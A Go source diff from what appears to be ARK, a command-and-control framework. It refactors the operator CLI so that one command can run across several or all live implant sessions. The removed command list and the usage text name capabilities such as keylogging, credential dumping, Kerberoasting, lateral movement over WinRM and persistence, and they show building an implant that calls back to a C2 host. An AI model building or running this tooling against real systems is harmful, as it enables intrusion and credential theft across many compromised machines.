@@ -7,16 +7,6 @@ import (
 	pb "github.com/KKingZero/ARK/pkg/pb"
 )
 
-// sessionCommands need an implant session. One-shot `ark op` auto-picks
-// the first alive session when --session is omitted.
-var sessionCommands = map[string]struct{}{
-	"shell": {}, "upload": {}, "download": {}, "ps": {}, "kill": {},
-	"ifconfig": {}, "portscan": {}, "sleep": {}, "screenshot": {},
-	"keylog": {}, "inject": {}, "ldap-enum": {}, "kerberoast": {},
-	"asreproast": {}, "creds-dump": {}, "lateral": {}, "smb": {},
-	"persist": {}, "privesc": {}, "cloud": {}, "socks": {},
-}
-
 // Exec runs one operator command non-interactively (ark op).
 func Exec(opts Options, args []string) error {
 	if len(args) < 1 {
@@ -30,8 +20,8 @@ func Exec(opts Options, args []string) error {
 	}
 	// Host-local: no teamserver / certs.
 	if cmd == "inbound" {
-		h := (&Commands{}).Handlers()["inbound"]
-		return h(rest)
+		d, _ := commandDescriptorByName("inbound")
+		return d.Handler(&Commands{}, rest)
 	}
 	if cmd == "generate" {
 		if _, err := parseGenerateArgs(rest); err != nil {
@@ -61,27 +51,19 @@ func Exec(opts Options, args []string) error {
 	}
 
 	c := NewCommands(client, approver)
+	c.oneShot = true
 	session, rest := peelSessionFlag(rest)
 	if session != "" {
 		if err := c.cmdUse([]string{session}); err != nil {
 			return err
 		}
-	} else if _, need := sessionCommands[cmd]; need {
+	} else if d, ok := commandDescriptorByName(cmd); ok && d.NeedsSession {
 		if err := c.useFirstAlive(); err != nil {
 			return err
 		}
 	}
 
-	if cmd == "approve-all" {
-		return c.cmdApproveAll(nil)
-	}
-
 	h, ok := c.Handlers()[cmd]
-	if !ok {
-		if cmd == "replay-clear" || cmd == "clear-replay" {
-			h, ok = c.Handlers()["replay-clear"]
-		}
-	}
 	if !ok {
 		return fmt.Errorf("unknown op command %q (try: ark op help)", cmd)
 	}
@@ -117,6 +99,43 @@ func (c *Commands) useFirstAlive() error {
 		}
 	}
 	return fmt.Errorf("no alive session")
+}
+
+func (c *Commands) resolveSessionSelector(sel string) ([]string, error) {
+	ids := splitSessionSelector(sel)
+	if len(ids) == 1 && (ids[0] == "all" || ids[0] == "alive") {
+		ctx, cancel := c.ctx()
+		defer cancel()
+		resp, err := c.client.ListSessions(ctx, &pb.ListSessionsRequest{})
+		if err != nil {
+			return nil, err
+		}
+		ids = ids[:0]
+		for _, s := range resp.Sessions {
+			if s.Alive {
+				ids = append(ids, s.SessionId)
+			}
+		}
+		if len(ids) == 0 {
+			return nil, fmt.Errorf("no alive session")
+		}
+	}
+	if len(ids) == 0 {
+		return nil, fmt.Errorf("empty session selector")
+	}
+	return ids, nil
+}
+
+func splitSessionSelector(sel string) []string {
+	parts := strings.Split(sel, ",")
+	ids := make([]string, 0, len(parts))
+	for _, p := range parts {
+		p = strings.TrimSpace(p)
+		if p != "" {
+			ids = append(ids, p)
+		}
+	}
+	return ids
 }
 
 func (c *Commands) cmdApproveAll(_ []string) error {
@@ -158,7 +177,9 @@ const opUsage = `ark op — non-interactive operator commands (same handlers as 
   ark op sessions
   ark op pending
   ark op approve-all
-  ark op shell [--session ID] <command...>
+  ark op shell [--session ID|ID,ID|alive|all] <command...>
+  ark op ps|ifconfig [--session ID|ID,ID|alive|all]
+  ark op smb list_shares --host H [--session ID|ID,ID|alive|all]
   ark op lateral winrm <target> <command> --user U --domain D (--pass P | --hash H)
   ark op generate --os windows --language c --transport https --callback https://C2:8443 --out implant.exe
   ark op register-secret <implant_id> <secret_hex> [build_id]
